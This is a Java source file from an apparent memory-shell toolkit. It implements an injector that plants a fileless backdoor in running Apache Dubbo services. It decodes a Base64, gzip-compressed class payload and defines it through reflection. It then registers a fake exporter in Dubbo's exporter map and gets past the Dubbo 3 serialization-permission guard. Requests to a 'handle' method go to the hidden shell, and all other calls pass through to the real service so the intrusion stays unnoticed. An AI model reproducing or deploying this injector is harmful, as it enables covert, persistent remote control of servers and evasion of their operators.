package com.reajason.javaweb.memshell.injector.dubbo;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.PrintStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.security.ProtectionDomain;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;
import java.util.zip.GZIPInputStream;

/**
 * Inserts a virtual exporter into the running DubboProtocol exporter map. Incoming
 * invocations on the control path are served by the embedded shell; every other method is
 * delegated to the original provider invoker.
 */
public class ApacheDubboExporterInjector {

    private static final String PREFIX = "org.apache.dubbo";
    private static final String DISPLAY_HOST = "x.x.x.x";
    private static final String HANDLE = "handle";
    private static final String GENERIC_INVOKE = "$invoke";

    private static String msg = "";
    private static boolean ok = false;

    public String getUrlPattern() {
        return "{{urlPattern}}";
    }

    public String getClassName() {
        return "{{className}}";
    }

    public String getBase64String() {
        return "{{base64Str}}";
    }

    public ApacheDubboExporterInjector() {
        if (ok) {
            return;
        }
        try {
            msg += registerExporter();
        } catch (Throwable e) {
            msg += "unexcepted error: " + getErrorMessage(e);
        }
        ok = true;
        System.out.println(msg);
    }

    public String registerExporter() throws Exception {
        String path = normalizePath(getUrlPattern());
        if (path.isEmpty()) {
            throw new IllegalArgumentException("path must not be empty");
        }

        ClassLoader classLoader = resolveDubboClassLoader();
        Class<?> shellClass = loadClass(classLoader, getBase64String());
        Object shell = instantiate(shellClass);
        Method handle = shellClass.getMethod(HANDLE, byte[].class);
        handle.setAccessible(true);

        Object protocol = resolveProtocol(classLoader);
        Object exporterHolder = resolveExporterHolder(protocol);
        Map<Object, Object> exporterMap = asMap(exporterHolder);
        Object delegate = findDelegate(exporterMap, path);
        if (delegate == null) {
            throw new IllegalStateException("no exported dubbo service found");
        }

        int port = portOf(delegate);
        String key = serviceKey(classLoader, port, path);
        Object invoker = createInvoker(classLoader, delegate, shell, handle);
        Object exporter = createExporter(classLoader, invoker, key, exporterHolder, exporterMap);
        registerSerializationPermission(protocol, classLoader, port, path);
        putExporter(exporterHolder, exporterMap, key, exporter);
        return "dubbo://" + DISPLAY_HOST + ":" + port + "/" + path;
    }

    /**
     * Dubbo 3 decodes only requests whose service is registered with the
     * PermittedSerializationKeeper, a service-level guard that runs before the exporter map is
     * consulted. A virtual exporter has no ServiceConfig behind it, so register it there too.
     */
    private void registerSerializationPermission(Object protocol, ClassLoader classLoader,
                                                 int port, String path) {
        try {
            Object frameworkModel = findFieldValue(protocol, "frameworkModel");
            if (frameworkModel == null) {
                return;
            }
            Class<?> keeperClass = Class.forName(
                    PREFIX + ".rpc.protocol.PermittedSerializationKeeper", true, classLoader);
            Object beanFactory = frameworkModel.getClass().getMethod("getBeanFactory")
                    .invoke(frameworkModel);
            Object keeper = beanFactory.getClass().getMethod("getBean", Class.class)
                    .invoke(beanFactory, keeperClass);
            if (keeper == null) {
                return;
            }
            Class<?> urlClass = Class.forName(PREFIX + ".common.URL", true, classLoader);
            Map<String, String> parameters = new HashMap<String, String>();
            parameters.put("interface", path);
            Object url = urlClass
                    .getConstructor(String.class, String.class, int.class, String.class, Map.class)
                    .newInstance("dubbo", DISPLAY_HOST, port, path, parameters);
            keeperClass.getMethod("registerService", urlClass).invoke(keeper, url);
        } catch (Throwable ignored) {
            // Dubbo 2.x has no such guard and older 3.x releases lack the bean.
        }
    }

    private Object resolveProtocol(ClassLoader classLoader) throws Exception {
        Class<?> protocolClass = Class.forName(PREFIX + ".rpc.protocol.dubbo.DubboProtocol", true, classLoader);
        Object protocol = protocolClass.getMethod("getDubboProtocol").invoke(null);
        if (protocol != null) {
            return protocol;
        }
        Class<?> protocolInterface = Class.forName(PREFIX + ".rpc.Protocol", true, classLoader);
        Class<?> extensionLoaderClass = Class.forName(PREFIX + ".common.extension.ExtensionLoader", true, classLoader);
        Object extensionLoader = extensionLoaderClass
                .getMethod("getExtensionLoader", Class.class)
                .invoke(null, protocolInterface);
        return extensionLoader.getClass().getMethod("getExtension", String.class)
                .invoke(extensionLoader, "dubbo");
    }

    /**
     * 2.7.23 stores a DelegateExporterMap in the protocol field while older and newer
     * releases store the map directly, so keep the raw holder and read the map from it.
     */
    private Object resolveExporterHolder(Object protocol) throws Exception {
        Object holder = findFieldValue(protocol, "exporterMap");
        if (holder != null) {
            return holder;
        }
        Method getter = findMethod(protocol.getClass(), "getExporterMap");
        if (getter != null) {
            getter.setAccessible(true);
            Object value = getter.invoke(protocol);
            if (value != null) {
                return value;
            }
        }
        throw new IllegalStateException("dubbo exporter map not found");
    }

    @SuppressWarnings("unchecked")
    private Map<Object, Object> asMap(Object holder) throws Exception {
        if (holder instanceof Map) {
            return (Map<Object, Object>) holder;
        }
        Method getter = findMethod(holder.getClass(), "getExporterMap");
        if (getter == null) {
            throw new IllegalStateException("dubbo exporter map not found on " + holder.getClass().getName());
        }
        getter.setAccessible(true);
        return (Map<Object, Object>) getter.invoke(holder);
    }

    private Object findDelegate(Map<Object, Object> exporterMap, String path) {
        Object first = null;
        for (Object exporter : exporterMap.values()) {
            Object invoker = invokeNoArgs(exporter, "getInvoker");
            if (invoker == null) {
                continue;
            }
            if (first == null) {
                first = invoker;
            }
            Object url = invokeNoArgs(invoker, "getUrl");
            String exportedPath = normalizePath(stringValue(invokeNoArgs(url, "getPath")));
            if (!path.equals(exportedPath)) {
                return invoker;
            }
        }
        return first;
    }

    private int portOf(Object invoker) {
        Object url = invokeNoArgs(invoker, "getUrl");
        Object port = invokeNoArgs(url, "getPort");
        if (!(port instanceof Number)) {
            throw new IllegalStateException("exported dubbo invoker has no port");
        }
        return ((Number) port).intValue();
    }

    private String serviceKey(ClassLoader classLoader, int port, String path) throws Exception {
        Class<?> abstractProtocol = Class.forName(PREFIX + ".rpc.protocol.AbstractProtocol", true, classLoader);
        Method serviceKey = abstractProtocol.getDeclaredMethod(
                "serviceKey", int.class, String.class, String.class, String.class);
        serviceKey.setAccessible(true);
        return (String) serviceKey.invoke(null, port, path, null, null);
    }

    private Object createInvoker(final ClassLoader classLoader, final Object delegate,
                                 final Object shell, final Method handle) throws Exception {
        Class<?> invokerClass = Class.forName(PREFIX + ".rpc.Invoker", true, classLoader);
        InvocationHandler handler = (proxy, method, args) -> {
            if ("invoke".equals(method.getName()) && args != null && args.length == 1) {
                byte[] request = controlRequest(args[0]);
                if (request != null) {
                    return newResult(classLoader, handle.invoke(shell, request), args[0]);
                }
            }
            if ("destroy".equals(method.getName())) {
                return null;
            }
            if ("isAvailable".equals(method.getName())) {
                return Boolean.TRUE;
            }
            try {
                return method.invoke(delegate, args);
            } catch (InvocationTargetException e) {
                throw e.getTargetException();
            }
        };
        return Proxy.newProxyInstance(invokerClass.getClassLoader(), new Class<?>[]{invokerClass}, handler);
    }

    private byte[] controlRequest(Object invocation) {
        String methodName = stringValue(invokeNoArgs(invocation, "getMethodName"));
        Object rawArguments = invokeNoArgs(invocation, "getArguments");
        if (!(rawArguments instanceof Object[])) {
            return null;
        }
        Object[] arguments = (Object[]) rawArguments;
        if (HANDLE.equals(methodName) && arguments.length == 1 && arguments[0] instanceof byte[]) {
            return (byte[]) arguments[0];
        }
        if (GENERIC_INVOKE.equals(methodName) && arguments.length == 3
                && HANDLE.equals(stringValue(arguments[0]))
                && arguments[2] instanceof Object[]) {
            Object[] realArguments = (Object[]) arguments[2];
            if (realArguments.length == 1 && realArguments[0] instanceof byte[]) {
                return (byte[]) realArguments[0];
            }
        }
        return null;
    }

    /**
     * DubboProtocol.reply calls Result.thenApply on whatever the invoker returns, and a bare
     * AppResponse throws there. The filter chain always answers with an AsyncRpcResult, so the
     * exporter has to do the same.
     */
    private Object newResult(ClassLoader classLoader, Object value, Object invocation) throws Exception {
        Class<?> responseClass = Class.forName(PREFIX + ".rpc.AppResponse", true, classLoader);
        Object response = responseClass.getConstructor(Object.class).newInstance(value);
        Class<?> resultClass = Class.forName(PREFIX + ".rpc.AsyncRpcResult", true, classLoader);
        Method factory = null;
        for (Method candidate : resultClass.getMethods()) {
            if (!"newDefaultAsyncResult".equals(candidate.getName())
                    || candidate.getParameterTypes().length != 2
                    || !candidate.getParameterTypes()[0].isInstance(response)
                    || !candidate.getParameterTypes()[1].isInstance(invocation)) {
                continue;
            }
            if (factory == null
                    || (factory.getParameterTypes()[0] == Object.class
                    && candidate.getParameterTypes()[0] != Object.class)) {
                factory = candidate;
            }
        }
        if (factory == null) {
            throw new IllegalStateException("no compatible AsyncRpcResult factory found");
        }
        return factory.invoke(null, response, invocation);
    }

    private Object createExporter(ClassLoader classLoader, Object invoker, String key,
                                  Object holder, Map<Object, Object> exporterMap) throws Exception {
        Class<?> exporterClass = Class.forName(
                PREFIX + ".rpc.protocol.dubbo.DubboExporter", true, classLoader);
        for (Constructor<?> constructor : exporterClass.getConstructors()) {
            Class<?>[] parameterTypes = constructor.getParameterTypes();
            if (parameterTypes.length != 3 || parameterTypes[1] != String.class
                    || !parameterTypes[0].isInstance(invoker)) {
                continue;
            }
            Object third;
            if (parameterTypes[2].isInstance(holder)) {
                third = holder;
            } else if (parameterTypes[2].isInstance(exporterMap)) {
                third = exporterMap;
            } else {
                continue;
            }
            return constructor.newInstance(invoker, key, third);
        }
        throw new IllegalStateException("no compatible DubboExporter constructor found");
    }

    private void putExporter(Object holder, Map<Object, Object> exporterMap,
                             String key, Object exporter) throws Exception {
        Method addExport = findMethod(holder.getClass(), "addExportMap");
        if (addExport != null) {
            addExport.setAccessible(true);
            addExport.invoke(holder, key, exporter);
            return;
        }
        exporterMap.put(key, exporter);
    }

    private Class<?> loadClass(ClassLoader classLoader, String payload) throws Exception {
        byte[] classBytes = gzipDecompress(Base64.getDecoder().decode(payload));
        definePackageIfNeeded(classLoader, getClassName());
        Method defineClass = ClassLoader.class.getDeclaredMethod(
                "defineClass",
                String.class,
                byte[].class,
                int.class,
                int.class,
                ProtectionDomain.class
        );
        defineClass.setAccessible(true);
        return (Class<?>) defineClass.invoke(
                classLoader, null, classBytes, 0, classBytes.length,
                ApacheDubboExporterInjector.class.getProtectionDomain());
    }

    private ClassLoader resolveDubboClassLoader() {
        ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();
        try {
            Class<?> classGenerator = Class.forName(
                    PREFIX + ".common.bytecode.ClassGenerator", false, contextClassLoader);
            ClassLoader dubboClassLoader = classGenerator.getClassLoader();
            if (dubboClassLoader != null) {
                return dubboClassLoader;
            }
        } catch (Throwable ignored) {
            // Fall back to the context class loader below.
        }
        return contextClassLoader != null
                ? contextClassLoader : ApacheDubboExporterInjector.class.getClassLoader();
    }

    private void definePackageIfNeeded(ClassLoader classLoader, String className) {
        int packageEnd = className.lastIndexOf('.');
        if (packageEnd < 0) {
            return;
        }
        String packageName = className.substring(0, packageEnd);
        try {
            Method getPackage = ClassLoader.class.getDeclaredMethod("getPackage", String.class);
            getPackage.setAccessible(true);
            if (getPackage.invoke(classLoader, packageName) != null) {
                return;
            }
            Method definePackage = ClassLoader.class.getDeclaredMethod(
                    "definePackage",
                    String.class,
                    String.class,
                    String.class,
                    String.class,
                    String.class,
                    String.class,
                    String.class,
                    java.net.URL.class
            );
            definePackage.setAccessible(true);
            definePackage.invoke(classLoader, packageName, null, null, null, null, null, null, null);
        } catch (Exception ignored) {
            // The class can still be defined without an explicit package.
        }
    }

    private Object instantiate(Class<?> type) throws Exception {
        Constructor<?> constructor = type.getDeclaredConstructor();
        constructor.setAccessible(true);
        return constructor.newInstance();
    }

    private String normalizePath(String value) {
        if (value == null) {
            return "";
        }
        String normalized = value.trim();
        while (normalized.startsWith("/")) {
            normalized = normalized.substring(1);
        }
        return normalized;
    }

    private Object findFieldValue(Object target, String name) {
        Class<?> type = target.getClass();
        while (type != null) {
            try {
                Field field = type.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(target);
            } catch (NoSuchFieldException e) {
                type = type.getSuperclass();
            } catch (Exception e) {
                return null;
            }
        }
        return null;
    }

    private Method findMethod(Class<?> type, String name) {
        Class<?> current = type;
        while (current != null) {
            try {
                Method method = current.getDeclaredMethod(name);
                method.setAccessible(true);
                return method;
            } catch (NoSuchMethodException e) {
                current = current.getSuperclass();
            }
        }
        return null;
    }

    private Object invokeNoArgs(Object target, String name) {
        if (target == null) {
            return null;
        }
        try {
            Method method = target.getClass().getMethod(name);
            method.setAccessible(true);
            return method.invoke(target);
        } catch (Exception e) {
            return null;
        }
    }

    private String stringValue(Object value) {
        return value instanceof String ? (String) value : "";
    }

    private static byte[] gzipDecompress(byte[] compressed) throws IOException {
        ByteArrayOutputStream output = new ByteArrayOutputStream();
        try (GZIPInputStream input = new GZIPInputStream(new ByteArrayInputStream(compressed))) {
            byte[] buffer = new byte[4096];
            int read;
            while ((read = input.read(buffer)) > 0) {
                output.write(buffer, 0, read);
            }
        }
        return output.toByteArray();
    }

    private String getErrorMessage(Throwable throwable) {
        try (ByteArrayOutputStream output = new ByteArrayOutputStream();
             PrintStream printStream = new PrintStream(output)) {
            throwable.printStackTrace(printStream);
            return output.toString();
        } catch (IOException e) {
            return String.valueOf(throwable);
        }
    }

    public String toString() {
        return msg;
    }
}
